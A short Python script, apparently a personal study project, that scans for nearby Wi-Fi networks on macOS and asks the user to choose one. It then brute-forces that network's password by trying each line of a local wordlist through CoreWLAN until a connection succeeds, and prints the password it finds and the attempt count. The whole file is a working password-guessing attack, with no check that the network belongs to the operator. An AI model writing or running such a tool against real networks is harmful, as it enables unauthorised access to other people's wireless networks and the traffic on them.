import objc
import subprocess

bash_command = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s"
subprocess.call(bash_command.split())

SSID = input(" Select your SSID from above : ")

objc.loadBundle("CoreWLAN", bundle_path="/System/Library/Frameworks/CoreWLAN.framework", module_globals=globals())
iface = CWInterface.interface()
networks, error = iface.scanForNetworksWithName_error_(str(SSID.strip()), None)
network = networks.anyObject()

count = 0

with open("/Users/yosuniiiii/python_study/python_mini_Project/expect_password.txt", "r") as wifi_password:
    for line in wifi_password.readlines():
        count += 1
        print("Trying... with : {}".format(str(line)))
        pw = str(line.strip())
        success , error = iface.associateToNetwork_password_error_(network, pw, None)
        if success == 1:
            print("Found it !! the password is  : {}".format(str(line)))
            print(" 시도한 횟수 : [{}]".format(count))
            break

